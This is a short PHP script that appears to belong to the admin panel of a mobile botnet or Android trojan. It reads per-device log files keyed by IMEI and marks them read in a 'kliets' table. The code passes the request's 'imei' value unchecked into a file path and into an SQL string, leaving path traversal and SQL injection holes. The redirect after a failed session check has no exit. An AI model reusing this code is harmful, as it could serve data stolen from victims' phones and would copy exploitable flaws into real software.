<?php
session_start();
$statusCode=false;
if (!(isset($_SESSION['panel_user'])))
{
	session_destroy();
	header("Location: /index.php");
}else{
	
	if ($_SESSION['panel_status']!="Action"){
		session_destroy();
		header("Location: /index.php");
	}else{
		$statusCode=true;
	}
}
if($statusCode){
	if(isset($_REQUEST['imei'])){
	$getIMEI = $_REQUEST['imei'];
		if (@fopen("../datalogs/logs/$getIMEI.log", "r")){ // проверяем на существование файла
			$filename = "../datalogs/logs/$getIMEI.log";
			$handle = fopen($filename, "r");
		    $contents = fread($handle, filesize($filename));
			fclose($handle);

			include '../../config.php';
			$connection3 = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
			$connection3->exec('SET NAMES utf8');
			$statement = $connection3->prepare("UPDATE kliets SET log='0' WHERE IMEI = '$getIMEI';");
			$statement->execute(array($getIMEI));
			echo "$contents";
		}
	}
}?>
